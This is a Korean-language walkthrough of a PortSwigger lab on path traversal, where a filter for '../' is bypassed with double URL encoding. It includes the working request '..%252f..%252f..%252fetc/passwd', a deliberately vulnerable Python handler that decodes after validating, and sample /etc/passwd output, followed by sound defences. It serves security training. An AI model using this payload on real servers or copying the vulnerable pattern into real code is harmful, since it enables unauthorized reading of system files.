# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

## 개요

- **난이도**: Practitioner
- **주제**: Path Traversal — 불필요한 URL 디코딩(superfluous URL-decode) / 이중 인코딩(double encoding)
- **링크**: https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode

## 목표

애플리케이션이 경로 순회 시퀀스를 차단한 **뒤에** 입력을 URL 디코딩한다는 점을 악용해, 이중 인코딩(`..%252f`)으로 검증을 통과한 뒤 디코딩 단계에서 `../` 로 복원되도록 만들어 `/etc/passwd` 를 읽는다.

## 이전 랩과의 차이

```
[001 — simple case]
  방어 없음
  → ../../../etc/passwd

[002 — absolute path bypass]
  "../" 차단
  → /etc/passwd (절대경로)

[003 — non-recursive strip]
  "../" 1회 제거
  → ....// (제거 후 ../ 재조합)

[004 — superfluous URL-decode (이번)]
  "../" 차단 후 URL 디코딩 수행
  → ..%252f  (디코딩 2회 후 ../ 복원)
```

핵심: **검증(차단)과 디코딩의 순서가 뒤바뀌면, 검증 시점에는 안전해 보이는
인코딩된 입력이 실제 사용 시점에는 위험한 값으로 변한다.**

## 취약 지점

```http
GET /image?filename=21.jpg HTTP/1.1
              ↑
       검증 후 URL 디코딩되는 파라미터
```

서버 내부 처리 (추정):

```python
filename = request.args.get("filename")   # 1차 디코딩은 웹서버/프레임워크가 수행

# 1) "../" 차단 검사 (이 시점에는 인코딩되어 있어 통과)
if "../" in filename or "..\\" in filename:
    return "Blocked", 400

# 2) 검증 후 불필요한 URL 디코딩 수행
filename = urllib.parse.unquote(filename)

# 3) 디코딩된 결과를 경로에 사용
with open("/var/www/images/" + filename, "rb") as f:
    return f.read()
```

## 우회 원리 — 이중 인코딩 추적

`..%252f` 는 `..` + `%25`(→ `%`) + `2f`(→ `/`) 로, 두 번 디코딩하면 `../` 가 된다.

```
전송 값:        ..%252f..%252f..%252fetc/passwd

[1차 디코딩 — 웹서버/프레임워크]
  %25 → %
  → ..%2f..%2f..%2fetc/passwd

[차단 검증 — "../" 탐색]
  문자열에 "../" 없음 (%2f 상태)
  → 검증 통과  ✔

[2차 디코딩 — 애플리케이션의 superfluous decode]
  %2f → /
  → ../../../etc/passwd

[경로 사용]
  /var/www/images/../../../etc/passwd
  → /etc/passwd  ← 읽기 성공
```

정리하면:

```
인코딩 단계       전송값        검증 시 보이는 값     최종 사용 값
------------------------------------------------------------------
1회 인코딩        ..%2f         ../  (차단됨)         -
2회 인코딩        ..%252f       ..%2f (통과)          ../  ← 우회
```

## 공격 단계

### 1단계 — 이미지 요청 캡처

```http
GET /image?filename=21.jpg HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### 2단계 — 일반 인코딩/차단 확인

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
→ 차단

GET /image?filename=..%2f..%2f..%2fetc/passwd HTTP/1.1
→ 1차 디코딩 후 "../" 가 노출되어 차단
```

### 3단계 — 이중 인코딩으로 우회

```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### 4단계 — 응답 확인

`/etc/passwd` 내용이 그대로 반환되면 랩 해결.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## URL 인코딩/디코딩 기초

```
%2e = .
%2f = /
%5c = \

%25 = %
  → %252f = %25 + 2f = "%" + "2f" = "%2f"
  → 디코딩 1회: %252f → %2f
  → 디코딩 2회: %2f   → /

정상적인 처리 순서:
  디코딩 → 검증 → 사용

취약한 처리 순서 (이번 랩):
  검증 → 디코딩 → 사용
  → 검증 시점과 사용 시점의 값이 달라짐
```

## 방어

```
[잘못된 방어 — 이번 랩의 취약점]
  if "../" in filename: 차단
  filename = unquote(filename)     # 검증 후 디코딩
  open(BASE + filename)
  → 이중 인코딩으로 검증 통과

[올바른 방어]
  1. 입력을 먼저 정규화(디코딩)한 뒤 검증
     - 가능하면 정확히 한 번만 디코딩하고, 이후 재디코딩 금지
  2. 검증은 블랙리스트가 아닌 화이트리스트/정규화 기반으로
     import os
     base = os.path.realpath("/var/www/images")
     target = os.path.realpath(os.path.join(base, filename))
     if not target.startswith(base + os.sep):
         raise ValueError("허용되지 않은 경로")
  3. 파일명만 허용
     filename = os.path.basename(filename)

[주의]
  "디코딩 → 검증 → 사용" 순서를 지키고,
  검증 이후에는 입력을 다시 변형(재디코딩/치환)하지 않아야 한다.
  검증과 사용 사이에 값이 바뀌면 검증이 무의미해진다.
```

## 핵심 정리

- 검증 후 불필요한 URL 디코딩이 있으면 이중 인코딩(`..%252f`)으로 `../` 를 복원해 우회할 수 있다.
- `%252f` 는 1차 디코딩에서 `%2f`, 2차 디코딩에서 `/` 가 되어 검증 시점과 사용 시점의 값이 달라진다.
- 디코딩·검증·사용의 순서가 방어의 핵심이며, 정상 순서는 "디코딩 → 검증 → 사용"이다.
- 안전한 방어는 경로 정규화 후 기준 디렉토리 포함 여부를 검증하는 것이다.

## 배운 점

- 003 이 문자열 치환의 반복 여부가 문제였다면, 004 는 인코딩/디코딩 처리 순서가 문제다.
- 같은 `../` 라도 "언제 디코딩되는가"에 따라 검증을 통과하거나 걸린다.
- TOCTOU(검사 시점과 사용 시점 불일치)와 유사한 원리로, 검증 이후 값이 변하면 우회된다.
